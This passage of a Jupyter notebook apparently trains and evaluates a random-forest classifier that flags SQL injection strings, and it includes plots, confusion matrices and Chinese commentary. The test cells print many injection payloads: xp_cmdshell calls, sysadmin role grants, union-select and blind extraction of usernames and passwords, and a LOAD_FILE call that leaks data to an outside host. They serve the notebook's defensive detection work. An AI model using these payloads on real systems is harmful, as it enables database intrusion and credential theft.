       "      <td>4.368792</td>\n",
       "      <td>480.567103</td>\n",
       "      <td>-70.566259</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>create user name identified by 'pass123'</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[DDL, Keyword, Identifier, Keyword, Keyword, S...</td>\n",
       "      <td>[('DDL',), ('Keyword',), ('Identifier',), ('Ke...</td>\n",
       "      <td>6</td>\n",
       "      <td>4.037326</td>\n",
       "      <td>-303.449183</td>\n",
       "      <td>1317.915066</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>create user name identified by pass123 tempora...</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[DDL, Keyword, Identifier, Keyword, Keyword, I...</td>\n",
       "      <td>[('DDL',), ('Keyword',), ('Identifier',), ('Ke...</td>\n",
       "      <td>13</td>\n",
       "      <td>4.028603</td>\n",
       "      <td>-465.234450</td>\n",
       "      <td>1469.098948</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>exec sp_addlogin 'name' , 'password'</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Keyword, Identifier, IdentifierList]</td>\n",
       "      <td>[('Keyword',), ('Identifier',), ('IdentifierLi...</td>\n",
       "      <td>3</td>\n",
       "      <td>4.030493</td>\n",
       "      <td>-288.232510</td>\n",
       "      <td>1150.607800</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>exec sp_addsrvrolemember 'name' , 'sysadmin'</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Keyword, Identifier, IdentifierList]</td>\n",
       "      <td>[('Keyword',), ('Identifier',), ('IdentifierLi...</td>\n",
       "      <td>3</td>\n",
       "      <td>4.010013</td>\n",
       "      <td>-288.232510</td>\n",
       "      <td>1150.607800</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                             raw_sql       type  \\\n",
       "0     '; exec master..xp_cmdshell 'ping 10.10.1.2'--  malicious   \n",
       "1           create user name identified by 'pass123'  malicious   \n",
       "2  create user name identified by pass123 tempora...  malicious   \n",
       "3               exec sp_addlogin 'name' , 'password'  malicious   \n",
       "4       exec sp_addsrvrolemember 'name' , 'sysadmin'  malicious   \n",
       "\n",
       "                                          parsed_sql  \\\n",
       "0  [Single, Identifier, Float, Float, Float, Erro...   \n",
       "1  [DDL, Keyword, Identifier, Keyword, Keyword, S...   \n",
       "2  [DDL, Keyword, Identifier, Keyword, Keyword, I...   \n",
       "3              [Keyword, Identifier, IdentifierList]   \n",
       "4              [Keyword, Identifier, IdentifierList]   \n",
       "\n",
       "                                           sequences  length   entropy  \\\n",
       "0  [('Single',), ('Identifier',), ('Float',), ('F...       7  4.368792   \n",
       "1  [('DDL',), ('Keyword',), ('Identifier',), ('Ke...       6  4.037326   \n",
       "2  [('DDL',), ('Keyword',), ('Identifier',), ('Ke...      13  4.028603   \n",
       "3  [('Keyword',), ('Identifier',), ('IdentifierLi...       3  4.030493   \n",
       "4  [('Keyword',), ('Identifier',), ('IdentifierLi...       3  4.010013   \n",
       "\n",
       "   malicious_g      legit_g  \n",
       "0   480.567103   -70.566259  \n",
       "1  -303.449183  1317.915066  \n",
       "2  -465.234450  1469.098948  \n",
       "3  -288.232510  1150.607800  \n",
       "4  -288.232510  1150.607800  "
      ]
     },
     "execution_count": 34,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dataframe.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Text(0, 0.5, 'SQL Statement Entropy')"
      ]
     },
     "execution_count": 37,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1080x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1080x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Boxplots show you the distribution of the data (spread).\n",
    "# http://en.wikipedia.org/wiki/Box_plot\n",
    "\n",
    "# Plot the length and entropy of SQL statements\n",
    "# Fixme Brian: make these pretty\n",
    "\n",
    "dataframe.boxplot('length','type')\n",
    "plt.ylabel('SQL Statement Length')\n",
    "dataframe.boxplot('entropy','type')\n",
    "plt.ylabel('SQL Statement Entropy')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Text(0, 0.5, 'SQL Statement Entropy')"
      ]
     },
     "execution_count": 60,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1080x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Split the classes up so we can set colors, size, labels\n",
    "fig, ax = plt.subplots(subplot_kw=dict(facecolor='#EEEEE5'))\n",
    "ax.grid(color='grey', linestyle='solid')\n",
    "cond = dataframe['type'] == 'malicious'\n",
    "evil = dataframe[cond]\n",
    "legit = dataframe[~cond]\n",
    "plt.scatter(legit['length'], legit['entropy'], s=140, c='#aaaaff', label='Legit', alpha=.7)\n",
    "plt.scatter(evil['length'], evil['entropy'], s=40, c='r', label='Injections', alpha=.3)\n",
    "plt.legend()\n",
    "plt.xlabel('SQL Statement Length')\n",
    "plt.ylabel('SQL Statement Entropy')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Text(0.5, 0, 'Malicious SQL G-Test Score')"
      ]
     },
     "execution_count": 61,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 1080x576 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Split the classes up so we can set colors, size, labels\n",
    "fig, ax = plt.subplots(subplot_kw=dict(facecolor='#EEEEE5'))\n",
    "ax.grid(color='grey', linestyle='solid')\n",
    "plt.scatter(legit['malicious_g'], legit['legit_g'], s=140, c='#aaaaff', label='Legit', alpha=.7)\n",
    "plt.scatter(evil['malicious_g'], evil['legit_g'], s=40, c='r', label='Injections', alpha=.3)\n",
    "plt.legend()\n",
    "plt.ylabel('Legit SQL G-Test Score')\n",
    "plt.xlabel('Malicious SQL G-Test Score')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "D:\\python\\lib\\site-packages\\ipykernel_launcher.py:5: FutureWarning: Method .as_matrix will be removed in a future version. Use .values instead.\n",
      "  \"\"\"\n"
     ]
    }
   ],
   "source": [
    "# In preparation for using scikit learn we're just going to use\n",
    "# some handles that help take us from pandas land to scikit land\n",
    "\n",
    "# List of feature vectors (scikit learn uses 'X' for the matrix of feature vectors)\n",
    "X = dataframe.as_matrix(['length', 'entropy','legit_g','malicious_g'])\n",
    "\n",
    "# Labels (scikit learn uses 'y' for classification labels)\n",
    "y = np.array(dataframe['type'].tolist())  # Yes, this is weird but it needs \n",
    "                                            # to be an np.array of strings"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Random Forest is a popular ensemble machine learning classifier.\n",
    "# http://scikit-learn.org/dev/modules/generated/sklearn.ensemble.RandomForestClassifier.html\n",
    "#\n",
    "import sklearn.ensemble\n",
    "clf = sklearn.ensemble.RandomForestClassifier(n_estimators=20) # Trees in the forest"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "ref: [sklearn.model_selection.cross_val_score v0.19.0](http://scikit-learn.org/stable/modules/generated/sklearn.model_selection.cross_val_score.html)\n",
    "\n",
    "> sklearn.model_selection.cross_val_score(estimator, X, y=None, groups=None, scoring=None, cv=None, n_jobs=1, verbose=0, fit_params=None, pre_dispatch=‘2*n_jobs’)\n",
    "\n",
    "cv : int, cross-validation generator or an iterable, optional\n",
    "\n",
    "Determines the cross-validation splitting strategy. Possible inputs for cv are:\n",
    "\n",
    "* None, to use the default 3-fold cross validation,\n",
    "* integer, to specify the number of folds in a (Stratified)KFold,\n",
    "* An object to be used as a cross-validation generator.\n",
    "* An iterable yielding train, test splits.\n",
    "\n",
    "n_jobs : integer, optional\n",
    "\n",
    "The number of CPUs to use to do the computation. -1 means ‘all CPUs’.\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 110,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[ 0.98418404  0.99856219  0.99928058  0.99784017  0.99640029  0.97552196\n",
      "  0.99856012  0.99640029  0.99784017  0.99424046]\n"
     ]
    }
   ],
   "source": [
    "# Now we can use scikit learn's cross validation to assess predictive performance.\n",
    "import sklearn.model_selection\n",
    "scores = sklearn.model_selection.cross_val_score(clf, X, y, cv=10, n_jobs=-1)\n",
    "print(scores)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 111,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# Wow 99% accurate! There is an issue though...\n",
    "# Recall that we have ~13k 'malicious SQL statements and\n",
    "# we only have about 1k 'legit' SQL statements, so we dive \n",
    "# in a bit and look at the predictive performance more deeply.\n",
    "\n",
    "# Train on a 80/20 split\n",
    "from sklearn.model_selection import train_test_split\n",
    "X_train, X_test, y_train, y_test, index_train, index_test = train_test_split(X, y, dataframe.index, test_size=0.2)\n",
    "clf.fit(X_train, y_train)\n",
    "y_pred = clf.predict(X_test)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 112,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Confusion Matrix Stats\n",
      "legit/legit: 97.21% (209/215)\n",
      "legit/malicious: 2.79% (6/215)\n",
      "malicious/legit: 0.16% (4/2564)\n",
      "malicious/malicious: 99.84% (2560/2564)\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<matplotlib.figure.Figure at 0x118f60358>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Now plot the results of the 80/20 split in a confusion matrix\n",
    "from sklearn.metrics import confusion_matrix\n",
    "labels = ['legit', 'malicious']\n",
    "cm = confusion_matrix(y_test, y_pred, labels)\n",
    "\n",
    "def plot_cm(cm, labels):\n",
    "    \n",
    "    # Compute percentanges\n",
    "    percent = (cm*100.0)/np.array(np.matrix(cm.sum(axis=1)).T)  # Derp, I'm sure there's a better way\n",
    "    \n",
    "    print('Confusion Matrix Stats')\n",
    "    for i, label_i in enumerate(labels):\n",
    "        for j, label_j in enumerate(labels):\n",
    "            print(\"%s/%s: %.2f%% (%d/%d)\" % (label_i, label_j, (percent[i][j]), cm[i][j], cm[i].sum()))\n",
    "\n",
    "    # Show confusion matrix\n",
    "    # Thanks kermit666 from stackoverflow :)\n",
    "    fig = plt.figure()\n",
    "    ax = fig.add_subplot(111)\n",
    "    ax.grid(b=False)\n",
    "    cax = ax.matshow(percent, cmap='coolwarm')\n",
    "    plt.title('Confusion matrix of the classifier')\n",
    "    fig.colorbar(cax)\n",
    "    ax.set_xticklabels([''] + labels)\n",
    "    ax.set_yticklabels([''] + labels)\n",
    "    plt.xlabel('Predicted')\n",
    "    plt.ylabel('Truth')\n",
    "    plt.show()\n",
    "\n",
    "plot_cm(cm, labels)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 135,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style>\n",
       "    .dataframe thead tr:only-child th {\n",
       "        text-align: right;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: left;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>raw_sql</th>\n",
       "      <th>type</th>\n",
       "      <th>parsed_sql</th>\n",
       "      <th>sequences</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>'; exec master..xp_cmdshell 'ping 10.10.1.2'--</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Single, Identifier, Float, Float, Float, Erro...</td>\n",
       "      <td>[('Single',), ('Identifier',), ('Float',), ('F...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1033</th>\n",
       "      <td>anything' or 'x'='x</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Identifier, Single, Identifier, Single, Ident...</td>\n",
       "      <td>[('Identifier',), ('Single',), ('Identifier',)...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1038</th>\n",
       "      <td>'; exec master..xp_cmdshell 'ping aaa.bbb.ccc....</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Single, Identifier, Error, Single]</td>\n",
       "      <td>[('Single',), ('Identifier',), ('Error',), ('S...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1043</th>\n",
       "      <td>'; if not(select system_user) &lt;&gt; 'sa' waitfor ...</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Single, Identifier, Single, Integer, Punctuat...</td>\n",
       "      <td>[('Single',), ('Identifier',), ('Single',), ('...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1044</th>\n",
       "      <td>'; if is_srvrolemember('sysadmin') &gt; 0 waitfor...</td>\n",
       "      <td>malicious</td>\n",
       "      <td>[Single, Identifier, Single, Integer, Punctuat...</td>\n",
       "      <td>[('Single',), ('Identifier',), ('Single',), ('...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                raw_sql       type  \\\n",
       "0        '; exec master..xp_cmdshell 'ping 10.10.1.2'--  malicious   \n",
       "1033                                anything' or 'x'='x  malicious   \n",
       "1038  '; exec master..xp_cmdshell 'ping aaa.bbb.ccc....  malicious   \n",
       "1043  '; if not(select system_user) <> 'sa' waitfor ...  malicious   \n",
       "1044  '; if is_srvrolemember('sysadmin') > 0 waitfor...  malicious   \n",
       "\n",
       "                                             parsed_sql  \\\n",
       "0     [Single, Identifier, Float, Float, Float, Erro...   \n",
       "1033  [Identifier, Single, Identifier, Single, Ident...   \n",
       "1038                [Single, Identifier, Error, Single]   \n",
       "1043  [Single, Identifier, Single, Integer, Punctuat...   \n",
       "1044  [Single, Identifier, Single, Integer, Punctuat...   \n",
       "\n",
       "                                              sequences  \n",
       "0     [('Single',), ('Identifier',), ('Float',), ('F...  \n",
       "1033  [('Identifier',), ('Single',), ('Identifier',)...  \n",
       "1038  [('Single',), ('Identifier',), ('Error',), ('S...  \n",
       "1043  [('Single',), ('Identifier',), ('Single',), ('...  \n",
       "1044  [('Single',), ('Identifier',), ('Single',), ('...  "
      ]
     },
     "execution_count": 135,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Documentation in sqlparse for the mapping can be found here: \n",
    "# https://github.com/andialbrecht/sqlparse/blob/master/sqlparse/keywords.py\n",
    "# or here\n",
    "# https://github.com/andialbrecht/sqlparse/blob/master/sqlparse/lexer.py\n",
    "\n",
    "# Here we look at example of the SQL sequence that G-Test has indicated are good\n",
    "# indicators of SQL injections.\n",
    "dataframe[dataframe['sequences'].map(lambda x: \"('Single', 'Identifier')\" in x)].head()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<div style=\"float: right; padding:10px;\"><img src=\"files/images/sad_party.jpg\" width=\"200px\"></div>\n",
    "<font size=4>Yea! Those scores look totally awesome, lets have a Party! But later we realize that if your system is processing 1 Million sql statements that with the predictive performance above you'll get tens of thousands of false positives, so now it's a Sad Party :(\n",
    "<br><br>\n",
    "But our Mom said we were still cool.. so we're going to exercise another nice feature. Most of the machine learning algorithm in scikit learn have a companion function to the normal 'predict' function... called 'predict_proba' where the model will compute the probability of that class matching based on various metrics. For instance, random forest bases the probability function on how many of the trees in the forest voted one way or the other.. so a probability of .7 means that 70% of the trees voted one way and the other 30% voted the other way.</font>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 136,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Confusion Matrix Stats\n",
      "legit/legit: 98.60% (212/215)\n",
      "legit/malicious: 1.40% (3/215)\n",
      "malicious/legit: 0.62% (16/2564)\n",
      "malicious/malicious: 99.38% (2548/2564)\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<matplotlib.figure.Figure at 0x11c6d2e48>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Compute the precition probabilities and use them to mimimize our false positives\n",
    "# Note: This is simply a trade off, it means we'll miss a few of the malicious\n",
    "# ones but typically false alarms are a death blow to any new 'fancy stuff' so\n",
    "# we definitely want to mimimize the false alarms.\n",
    "y_probs = clf.predict_proba(X_test)[:,1]\n",
    "thres = .95 # This can be set to whatever you'd like\n",
    "y_pred[y_probs<thres] = 'legit'\n",
    "y_pred[y_probs>=thres] = 'malicious'\n",
    "cm = confusion_matrix(y_test, y_pred, labels)\n",
    "plot_cm(cm, labels)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "由于测试数据集的关系，这个分类器更倾向于报告分类结果为：恶意，主要原因是数据集中恶意样本占比非常高"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 137,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<zip at 0x11b682208>"
      ]
     },
     "execution_count": 137,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# We can also look at what features the learning algorithm thought were the most important\n",
    "importances = zip(['length', 'entropy', 'legit_g', 'malicious_g'], clf.feature_importances_)\n",
    "importances\n",
    "\n",
    "# From the list below we see our feature importance scores. There's a lot of feature selection,\n",
    "# sensitivity study, etc stuff that you could do if you wanted at this point."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 138,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style>\n",
       "    .dataframe thead tr:only-child th {\n",
       "        text-align: right;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: left;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>raw_sql</th>\n",
       "      <th>type</th>\n",
       "      <th>parsed_sql</th>\n",
       "      <th>sequences</th>\n",
       "      <th>pred</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>347</th>\n",
       "      <td>GoogleGitSign in eclipse / datatools/org.eclip...</td>\n",
       "      <td>legit</td>\n",
       "      <td>[Identifier, Keyword, Operation, Operator, Ope...</td>\n",
       "      <td>[('Identifier',), ('Keyword',), ('Operation',)...</td>\n",
       "      <td>malicious</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>117</th>\n",
       "      <td>CREATE TABLE sylph.users ( id SERIAL PRIMARY K...</td>\n",
       "      <td>legit</td>\n",
       "      <td>[DDL, Keyword, Identifier, Punctuation, Identi...</td>\n",
       "      <td>[('DDL',), ('Keyword',), ('Identifier',), ('Pu...</td>\n",
       "      <td>malicious</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>610</th>\n",
       "      <td>SELECT dept, number, SUBSTR(title, 1, 12) AS s...</td>\n",
       "      <td>legit</td>\n",
       "      <td>[DML, Identifier, Punctuation, Builtin, Punctu...</td>\n",
       "      <td>[('DML',), ('Identifier',), ('Punctuation',), ...</td>\n",
       "      <td>malicious</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                               raw_sql   type  \\\n",
       "347  GoogleGitSign in eclipse / datatools/org.eclip...  legit   \n",
       "117  CREATE TABLE sylph.users ( id SERIAL PRIMARY K...  legit   \n",
       "610  SELECT dept, number, SUBSTR(title, 1, 12) AS s...  legit   \n",
       "\n",
       "                                            parsed_sql  \\\n",
       "347  [Identifier, Keyword, Operation, Operator, Ope...   \n",
       "117  [DDL, Keyword, Identifier, Punctuation, Identi...   \n",
       "610  [DML, Identifier, Punctuation, Builtin, Punctu...   \n",
       "\n",
       "                                             sequences       pred  \n",
       "347  [('Identifier',), ('Keyword',), ('Operation',)...  malicious  \n",
       "117  [('DDL',), ('Keyword',), ('Identifier',), ('Pu...  malicious  \n",
       "610  [('DML',), ('Identifier',), ('Punctuation',), ...  malicious  "
      ]
     },
     "execution_count": 138,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Now were going to just do some post analysis on how the ML algorithm performed.\n",
    "# Lets look at the legit samples that were misclassified as malicious\n",
    "test_set = dataframe.loc[index_test]\n",
    "test_set['pred'] = y_pred\n",
    "misclassified = test_set[(test_set['type']=='legit') & (test_set['pred']=='malicious')]\n",
    "misclassified.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 139,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# Discussion for how to use the resulting models.\n",
    "# Typically Machine Learning comes in two phases\n",
    "#    - Training of the Model\n",
    "#    - Evaluation of new observations against the Model\n",
    "# This notebook is about exploration of the data and training the model.\n",
    "# After you have a model that you are satisfied with, just 'pickle' it\n",
    "# at the end of the your training script and then in a separate\n",
    "# evaluation script 'unpickle' it and evaluate/score new observations\n",
    "# coming in (through a file, or ZeroMQ, or whatever...)\n",
    "#\n",
    "# In this case we'd have to pickle the RandomForest classifier.\n",
    "# See 'test_it' below for how to use them in evaluation mode.\n",
    "\n",
    "\n",
    "# test_it shows how to do evaluation, also fun for manual testing below :)\n",
    "def test_it(sql):\n",
    "    parsed_sql = parse_it(sql)\n",
    "    ngram_list = ngrams(parsed_sql, 3)\n",
    "    malicious_g = g_aggregate(ngram_list, 'malicious_g')\n",
    "    legit_g = g_aggregate(ngram_list, 'legit_g')\n",
    "    _X = [len(parsed_sql), entropy(sql), legit_g, malicious_g]\n",
    "    #print(np.asarray(_X).reshape(1, -1))\n",
    "    print('%-40s: %s' % (sql, clf.predict(np.asarray(_X).reshape(1, -1))[0]))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 140,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "select * from employees                 : legit\n",
      "'; exec master..xp_cmdshell             : malicious\n",
      "'any 'x'='x'                            : malicious\n",
      "from dorseys mom xp_cmdshell biache     : malicious\n",
      "select * from your_mom                  : legit\n"
     ]
    }
   ],
   "source": [
    "test_it('select * from employees')\n",
    "test_it(\"'; exec master..xp_cmdshell\")\n",
    "test_it(\"'any 'x'='x'\")\n",
    "test_it('from dorseys mom xp_cmdshell biache')\n",
    "test_it('select * from your_mom')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 141,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "hello                                   : legit\n",
      "233                                     : malicious\n",
      "3'                                      : malicious\n",
      "3 order by 1/*                          : malicious\n",
      "3 order by 2/*                          : malicious\n",
      "3 order by 3/*                          : malicious\n",
      "3 order by 4/*                          : malicious\n",
      "3 order by 5/*                          : malicious\n",
      "3 union all select 1,2,3,4/*            : malicious\n",
      "3 union all select 1,2,3,4--            : malicious\n",
      "3 union all select 1,2,@@version,4/*    : malicious\n",
      "3 union all select 1,2,password,4,5 from admin/*: malicious\n",
      "3 union all select 1,2,concat(username,0x3a,password),4,5 from admin/*: malicious\n",
      "3 and 1=1                               : malicious\n",
      "3 and 1=2                               : malicious\n",
      "3 and substring(@@version,1,1)=4        : malicious\n",
      "3 and substsubstringring(@@versversionion,1,1)=4: malicious\n",
      "3 and substring(@@version,1,1)=5        : malicious\n",
      "3 and (select 1)=1                      : malicious\n",
      "3 and (select 1 from mysql.user limit 0,1)=1: malicious\n",
      "3 and (select 1 from users limit 0,1)=1 : malicious\n",
      "3 and (select substring(concat(1,password),1,1) from users limit 0,1)=1: malicious\n",
      "3 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>80: malicious\n",
      "3 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),2,1))>99: malicious\n",
      "3 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>104: malicious\n",
      "3 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>107: malicious\n",
      "3 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>105: malicious\n",
      "' and (select substr(group_concat(pass),1,1) from users)='a: malicious\n",
      "-99 OR IF((ASCII(MID((select id from tb_users),1,1)) = 100),SLEEP(14),1) = 0 LIMIT 1--: malicious\n",
      "-99 OR (SELECT LOAD_FILE(concat('\\\\\\\\',(select id from tb_users), 'sec.cuc.edu.cn\\\\'))): legit\n",
      "-99 OR (SELECT id from tb_users INTO OUTFILE '\\\\\\\\tmp\\\\share\\\\output.txt'): legit\n",
      "1 OR 2-1=0                              : malicious\n",
      "areyouok                                : legit\n",
      "mamashuotebiechangdeparamshouldbemaliciousisnotalwaysright: legit\n",
      "mamashuo'tebiechangdeparamshouldbemaliciousisnotalwaysright: malicious\n",
      "1 and (SELECT count(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7, sysusers AS sys8)>1 and 75>(select top 1 ascii(substring(name,1,1)) from sysusers) : malicious\n"
     ]
    }
   ],
   "source": [
    "# 使用非./data目录中的样本数据测试\n",
    "with open('cheatsheet.txt') as cheatsheets:\n",
    "    for case in cheatsheets:\n",
    "        test_it(case.strip('\\n'))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Conclusions:\n",
    "The combination of IPython, Pandas and Scikit Learn let us pull in some junky SQL data, clean it up, plot it, understand it and slap it with some machine learning!\n",
    "\n",
    "Clearly a lot more formality could be used, plotting learning curves, adjusting for overfitting, feature selection, on and on... there are some really great machine learning resources that cover this deeper material. In particular we highly recommend the work and presentations of Olivier Grisel at INRIA Saclay. http://ogrisel.com/\n",
    "\n",
    " - W. G.J. Halfond, J. Viegas, and A. Orso, \"A Classiﬁcation of SQL Injection Attacks and Countermeasure\",[http://www-bcf.usc.edu/~halfond/papers/halfond06issse.pdf]\n",
    " - A. K. Baranwa1, \"Approaches to detect SQL injection and XSS in web applications,\" 2012. [http://blogs.ubc.ca/computersecurity/files/2012/04/ABaranwal_ApproachesToDetectSQLinjection_XSSinWebApplication.pdf]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "### Recommended Readings\n",
    "\n",
    "* [Time-Based Blind SQL Injection using Heavy Queries | A practical approach for MS SQL Server, MS Access, Oracle and MySQL databases and Marathon Tool](https://www.defcon.org/images/defcon-16/dc16-presentations/alonso-parada/defcon-16-alonso-parada-wp.pdf)\n",
    "* [free online reference about SQL injection attacks](http://www.sqlinjection.net/)\n",
    "* [SQL Injection Wiki | grouped by DBs](http://www.sqlinjectionwiki.com/)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 后记\n",
    "\n",
    "* 上述机器学习方法建立的分类器模型，如果需要获得良好的分类性能，数据质量和标记质量至关重要！其次是特征工程的作用，至关重要！\n",
    "* 由于每次训练过程是随机划分训练数据集和测试数据集，所以上述notebook脚本多次重复运行得到的分类器的分类性能会有细微差异。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 1
}
